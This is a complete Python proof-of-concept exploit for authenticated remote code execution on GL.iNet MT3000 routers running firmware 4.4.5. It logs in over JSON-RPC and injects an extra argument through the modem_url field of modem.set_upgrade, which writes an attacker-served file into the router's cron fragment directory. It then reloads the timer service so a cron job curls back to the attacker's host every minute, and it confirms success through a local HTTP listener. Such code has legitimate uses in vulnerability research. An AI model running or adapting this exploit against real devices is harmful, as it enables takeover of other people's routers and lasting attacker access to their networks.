#!/usr/bin/env python3
import argparse
import crypt
import hashlib
import http.server
import json
import socketserver
import threading
import time
from pathlib import Path
from urllib.parse import urlparse

import requests


HTTP_HITS = set()


class QuietHandler(http.server.SimpleHTTPRequestHandler):

    def do_GET(self):
        try:
            HTTP_HITS.add(urlparse(self.path).path)
        except Exception:
            HTTP_HITS.add(self.path)
        return super().do_GET()

    def log_message(self, fmt, *args):
        try:
            msg = fmt % args
        except Exception:
            msg = fmt
        print(f"[HTTP] {self.client_address[0]}:{self.client_address[1]} -> {msg}")


class ReusableTCPServer(socketserver.TCPServer):

    allow_reuse_address = True


def rpc_post(sess, base, method, params, req_id=1, verify=False, timeout=10):
    payload = {"jsonrpc": "2.0", "id": req_id, "method": method, "params": params}
    r = sess.post(f"{base}/rpc", json=payload, verify=verify, timeout=timeout)
    r.raise_for_status()
    data = r.json()
    if "error" in data:
        raise RuntimeError(f"RPC error: {json.dumps(data['error'], ensure_ascii=False)}")
    return data.get("result")


def login_445(sess, base, username, password, verify=False):
    """4.4.5 登录算法：crypt(password, challenge salt) 后做 MD5。"""

    chal = rpc_post(sess, base, "challenge", {"username": username}, req_id=1, verify=verify)
    crypted = crypt.crypt(password, f"${chal['alg']}${chal['salt']}$")
    digest = hashlib.md5(f"{username}:{crypted}:{chal['nonce']}".encode()).hexdigest()
    res = rpc_post(sess, base, "login", {"username": username, "hash": digest}, req_id=2, verify=verify)
    sid = res.get("sid") or sess.cookies.get("Admin-Token")
    if not sid:
        raise RuntimeError("login succeeded but no sid/Admin-Token found")
    return sid


def authenticate(sess, base, username, password, verify=False):
    candidates = [username] if username is not None else ["root"]
    last_exc = None
    for user in candidates:
        try:
            print(f"[+] attempting 4.4.5 login with username={user!r}, hash=md5")
            return login_445(sess, base, user, password, verify=verify), user
        except Exception as exc:
            last_exc = exc
            print(f"[!] login failed with username={user!r}: {exc}")
    raise last_exc


def rpc_call(sess, base, sid, obj, method, args, verify=False, timeout=15):
    return rpc_post(sess, base, "call", [sid, obj, method, args], req_id=3, verify=verify, timeout=timeout)


def start_http_server(directory: Path, host: str, port: int):
    handler = lambda *a, **kw: QuietHandler(*a, directory=str(directory), **kw)
    httpd = ReusableTCPServer((host, port), handler)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    return httpd, t


def build_modem_url(attacker_host: str, http_port: int, mode: str, fragment_path: str | None = None):

    stage1_url = f"http://{attacker_host}:{http_port}/stage1"

    if mode == "openwrt445-gl-fragment":
        path = fragment_path or "/etc/gl_crontabs/crontabs.d/p"
    elif mode == "openwrt445-tmp-gl-fragment":
        path = fragment_path or "/tmp/gl_crontabs/crontabs.d/q"
    else:
        raise ValueError(f"unsupported 4.4.5 payload mode: {mode}")

    return f"{stage1_url}\\ -o\\ {path} #", path


def trigger_gl_timer_reload(sess, base, sid, verify=False):

    try:
        args = rpc_call(sess, base, sid, "timer", "get_led", {}, verify=verify, timeout=20)
        args = dict(args) if isinstance(args, dict) else {}
    except Exception as exc:
        print(f"[!] timer.get_led failed, using disabled fallback: {exc}")
        args = {}

    args.setdefault("enable", False)
    args.setdefault("turnon_hour", "07")
    args.setdefault("turnon_min", "00")
    args.setdefault("turnoff_hour", "22")
    args.setdefault("turnoff_min", "00")
    args.setdefault("week", [0, 1, 2, 3, 4, 5, 6])

    print("[+] triggering timer.set_led to restart gl_timer and merge cron fragment ...")
    print(f"[+] timer.set_led args: {args}")
    return rpc_call(sess, base, sid, "timer", "set_led", args, verify=verify, timeout=20)


def main():
    ap = argparse.ArgumentParser(description="GL.iNet MT3000 4.4.5 modem.set_upgrade authenticated RCE PoC")
    ap.add_argument("--target", required=True, help="target router host/IP, e.g. 192.168.8.1")
    ap.add_argument("--scheme", default="http", choices=["http", "https"])
    ap.add_argument("--username", default="root", help="4.4.5 default admin username is usually root")
    ap.add_argument("--password", help="web admin password / root password")
    ap.add_argument("--token", help="Admin-Token / SID; if provided, skip login")
    ap.add_argument("--attacker-host", required=True, help="host/IP reachable by router")
    ap.add_argument("--http-bind", default="0.0.0.0", help="local HTTP bind addr")
    ap.add_argument("--http-port", type=int, default=8000)
    ap.add_argument("--verify", action="store_true", help="verify TLS certificate when using https")
    ap.add_argument("--wait", type=int, default=180, help="max seconds to wait for cron callback")
    ap.add_argument(
        "--payload-mode",
        default="openwrt445-gl-fragment",
        choices=["openwrt445-gl-fragment", "openwrt445-tmp-gl-fragment"],
        help="only successful GL-MT3000 4.4.5 modes are kept",
    )
    ap.add_argument(
        "--fragment-path",
        default=None,
        help=(
            "override cron fragment path; defaults: "
            "/etc/gl_crontabs/crontabs.d/p for openwrt445-gl-fragment, "
            "/tmp/gl_crontabs/crontabs.d/q for openwrt445-tmp-gl-fragment"
        ),
    )
    args = ap.parse_args()

    if not args.token and not args.password:
        ap.error("--password or --token is required")

    marker = f"RCE_OK_{int(time.time())}"
    webroot = Path("/tmp/modem_set_upgrade_rce_http")
    webroot.mkdir(parents=True, exist_ok=True)

    callback_path = f"/cb/{marker}"
    callback_url = f"http://{args.attacker_host}:{args.http_port}{callback_path}"
    cron_line = f"* * * * * /usr/bin/curl -fsS {callback_url} >/dev/null 2>&1\n"

    (webroot / "stage1").write_text(cron_line)
    (webroot / "cb").mkdir(parents=True, exist_ok=True)
    (webroot / "cb" / marker).write_text(f"CALLBACK_OK_{marker}\n")

    httpd, _ = start_http_server(webroot, args.http_bind, args.http_port)
    print(f"[+] local HTTP server started on {args.http_bind}:{args.http_port}")
    print(f"[+] served cron content: {cron_line.strip()}")
    print(f"[+] payload mode: {args.payload_mode}")

    sess = requests.Session()
    base = f"{args.scheme}://{args.target}"

    try:
        if args.token:
            sid = args.token
            print(f"[+] using provided token, sid={sid}")
        else:
            sid, user_used = authenticate(sess, base, args.username, args.password, verify=args.verify)
            print(f"[+] authenticated, username={user_used!r}, sid={sid}")

        modem_url, fragment_path = build_modem_url(
            args.attacker_host,
            args.http_port,
            args.payload_mode,
            fragment_path=args.fragment_path,
        )
        print(f"[+] target fragment path: {fragment_path}")
        print(f"[+] modem_url length: {len(modem_url)} bytes")
        print(f"[+] modem_url payload: {modem_url}")

        rpc_args = {
            "modem_url": modem_url,
            "target_version": "X",
            "current_version": "X",
            "firmware_upload": "router",
            "hash_type": "sha256",
            "hash_value": "deadbeef",
            "upgrade_type": "full_ota",
        }

        print("[+] triggering modem.set_upgrade ...")
        try:
            res = rpc_call(sess, base, sid, "modem", "set_upgrade", rpc_args, verify=args.verify, timeout=20)
            print(f"[+] modem.set_upgrade returned: {res}")
        except Exception as exc:
            print(f"[!] modem.set_upgrade raised after trigger (can still be exploitable): {exc}")

        time.sleep(1)
        try:
            res2 = trigger_gl_timer_reload(sess, base, sid, verify=args.verify)
            print(f"[+] timer.set_led returned: {res2}")
        except Exception as exc:
            print(f"[!] timer.set_led raised: {exc}")

        print(f"[+] waiting for cron callback {callback_url} for up to {args.wait}s")
        deadline = time.time() + args.wait
        while time.time() < deadline:
            if callback_path in HTTP_HITS:
                print("[+] SUCCESS: GL-MT3000 4.4.5 authenticated RCE confirmed via cron callback")
                print(f"[+] callback URL hit: {callback_url}")
                return
            time.sleep(5)

        print("[-] marker not observed within timeout")
        print("[-] observed HTTP hits:", sorted(HTTP_HITS) if HTTP_HITS else [])
        print("[-] If only /stage1 is seen, check whether gl_timer restarted and whether the fragment path exists on 4.4.5.")
    finally:
        httpd.shutdown()
        httpd.server_close()


if __name__ == "__main__":
    main()
